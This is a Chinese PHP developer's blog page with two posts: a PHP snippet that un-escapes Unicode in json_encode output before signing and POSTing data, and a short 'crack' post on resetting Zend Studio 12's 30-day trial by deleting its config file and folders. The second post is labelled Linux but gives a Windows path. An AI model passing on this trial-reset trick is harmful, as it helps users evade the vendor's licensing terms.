    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2015/10/16/e5-ae-9e-e7-8e-b0-php5-4-e4-b8-ad-json-encodestr-json-unescaped-unicode/">实现 PHP5.4中 json_encode($str, JSON_UNESCAPED_UNICODE)</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>/**</p>
<ul>
<li>实现 PHP5.4中 json_encode($str, JSON_UNESCAPED_UNICODE)<br><em>/<br>private function decodeUnicode($str)<br>{<br>return preg_replace_callback(‘/\\u([0-9a-f]{4})/i’, create_function( ‘$matches’, ‘return mb_convert_encoding(pack(“H</em>“, $matches[1]), “UTF-8”, “UCS-2BE”);’ ), $str);<br>}</li>
</ul>
<p>&nbsp;</p>
<p>$data = array(<br>‘header’=&gt;array(<br>‘appid’ =&gt; $appid,<br>‘sign’ =&gt; md5($appid.$this-&gt;decodeUnicode(json_encode($info)).$key),<br>),<br>‘body’=&gt; $info,<br>);<br>//dump(json_encode($data));<br>$Http = new Http();<br>$res = $Http-&gt;curlPost($url,array(‘data’=&gt;base64_encode(json_encode($data))),’’, false, 30);</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2015/10/16/e5-ae-9e-e7-8e-b0-php5-4-e4-b8-ad-json-encodestr-json-unescaped-unicode/" data-id="cinsnz8q8005gocpdqbzvlyrc" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-zend-studio-12-e7-a0-b4-e8-a7-a3-e6-b0-b8-e4-b9-85-e4-bd-bf-e7-94-a8-e7-9a-84-e6-96-b9-e6-b3-95" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2015/06/08/zend-studio-12-e7-a0-b4-e8-a7-a3-e6-b0-b8-e4-b9-85-e4-bd-bf-e7-94-a8-e7-9a-84-e6-96-b9-e6-b3-95/" class="article-date">
  <time datetime="2015-06-08T01:44:27.000Z" itemprop="datePublished">2015-06-08</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/Linux/">Linux</a>►<a class="article-category-link" href="/categories/Linux/工具/">工具</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2015/06/08/zend-studio-12-e7-a0-b4-e8-a7-a3-e6-b0-b8-e4-b9-85-e4-bd-bf-e7-94-a8-e7-9a-84-e6-96-b9-e6-b3-95/">zend studio 12 破解/永久使用的方法</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>&nbsp;</p>
<p>zend studio 12 破解/永久使用的方法</p>
<p>&nbsp;</p>
<p>linux:</p>
<p>1、进入下述路径：c/users/用户名，如果你的用户名是123，那就是在下述目录：C:\Users\123<br>2、删除一个文件和两个目录：.zs（文件），.ZendStudio（目录）、.zend（目录）<br>这样大功告成，当我们再次打开后，就又恢复到30天了。</p>
<p>&nbsp;</p>
<p>&nbsp;</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2015/06/08/zend-studio-12-e7-a0-b4-e8-a7-a3-e6-b0-b8-e4-b9-85-e4-bd-bf-e7-94-a8-e7-9a-84-e6-96-b9-e6-b3-95/" data-id="cinsnz8o30008ocpd2q0wjbtc" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
  
    <nav id="page-nav">
      <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/9/">9</a><a class="extend next" rel="next" href="/page/2/">Next &raquo;</a>
    </nav>
  
</section>
        
          <aside id="sidebar">
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Categories</h3>
    <div class="widget">
      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/HTTP/">HTTP</a><span class="category-list-count">3</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/HTTP/PHP/">PHP</a><span class="category-list-count">3</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/Linux/">Linux</a><span class="category-list-count">9</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/Linux/PHP/">PHP</a><span class="category-list-count">1</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/Linux/PHP/调试/">调试</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/Linux/PHP笔试题/">PHP笔试题</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Linux/mysql/">mysql</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Linux/nginx/">nginx</a><span class="category-list-count">1</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/Linux/nginx/PHP/">PHP</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/Linux/工具/">工具</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/PHP/">PHP</a><span class="category-list-count">22</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/PHP/PHP笔试题/">PHP笔试题</a><span class="category-list-count">13</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/PHP/PHP笔试题/数据结构与算法/">数据结构与算法</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/PHP/redis/">redis</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/PHP/调试/">调试</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/PHP笔试题/">PHP笔试题</a><span class="category-list-count">10</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/PHP笔试题/数据结构与算法/">数据结构与算法</a><span class="category-list-count">4</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/mi/">mi</a><span class="category-list-count">2</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/mi/PHP/">PHP</a><span class="category-list-count">2</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/mysql/">mysql</a><span class="category-list-count">23</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/mysql/PHP/">PHP</a><span class="category-list-count">2</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/mysql/PHP/PHP笔试题/">PHP笔试题</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/mysql/PHP笔试题/">PHP笔试题</a><span class="category-list-count">5</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/mysql/PHP笔试题/redis/">redis</a><span class="category-list-count">1</span></li></ul></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/python/">python</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/前端/">前端</a><span class="category-list-count">2</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/前端/移动/">移动</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/安全/">安全</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/数据结构与算法/">数据结构与算法</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/未分类/">未分类</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/脑洞/">脑洞</a><span class="category-list-count">2</span></li></ul>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tags</h3>
    <div class="widget">
      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/凤凰网面试题/">凤凰网面试题</a><span class="tag-list-count">6</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/小米面试题/">小米面试题</a><span class="tag-list-count">5</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/滴滴打车面试题/">滴滴打车面试题</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/猎豹移动面试题/">猎豹移动面试题</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/百度面试题/">百度面试题</a><span class="tag-list-count">9</span></li></ul>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tag Cloud</h3>
    <div class="widget tagcloud">
      <a href="/tags/凤凰网面试题/" style="font-size: 17.5px;">凤凰网面试题</a> <a href="/tags/小米面试题/" style="font-size: 15px;">小米面试题</a> <a href="/tags/滴滴打车面试题/" style="font-size: 12.5px;">滴滴打车面试题</a> <a href="/tags/猎豹移动面试题/" style="font-size: 10px;">猎豹移动面试题</a> <a href="/tags/百度面试题/" style="font-size: 20px;">百度面试题</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/03/">March 2016</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/02/">February 2016</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/12/">December 2015</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/11/">November 2015</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/10/">October 2015</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/06/">June 2015</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/05/">May 2015</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/03/">March 2015</a><span class="archive-list-count">7</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/01/">January 2015</a><span class="archive-list-count">23</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2014/12/">December 2014</a><span class="archive-list-count">22</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2014/11/">November 2014</a><span class="archive-list-count">19</span></li></ul>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recents</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2016/03/28/golang-defer的使用/">golang defer的使用</a>
          </li>
        
          <li>
            <a href="/2016/02/18/GO-lang的面向对象的理解/">GO-lang的面向对象的理解</a>
          </li>
        
          <li>
            <a href="/2016/02/16/GO-lang-的学习笔记/">GO lang 的学习笔记</a>
          </li>
        
          <li>
            <a href="/2016/02/16/hello-world/">Hello World</a>
          </li>
        
          <li>
            <a href="/2015/12/15/php-e5-a4-9a-e4-b8-aa-e5-80-bc-e7-9b-b8-e5-8a-a0-e6-98-af-e7-bb-99-e5-ae-9a-e7-9a-84-e4-b8-80-e4-b8-aa-e6-95-b0-ef-bc-8c-e6-b1-82-e5-a4-9a-e4-b8-aa-e5-80-bc-e7-9a-84-e7-bb-84-e5-90-88/">PHP 多个值相加是给定的一个数，求多个值的组合</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2016 John Doe<br>
      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>
    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    

<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>


  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css" type="text/css">
  <script src="/fancybox/jquery.fancybox.pack.js" type="text/javascript"></script>


<script src="/js/script.js" type="text/javascript"></script>

  </div>
</body>
</html>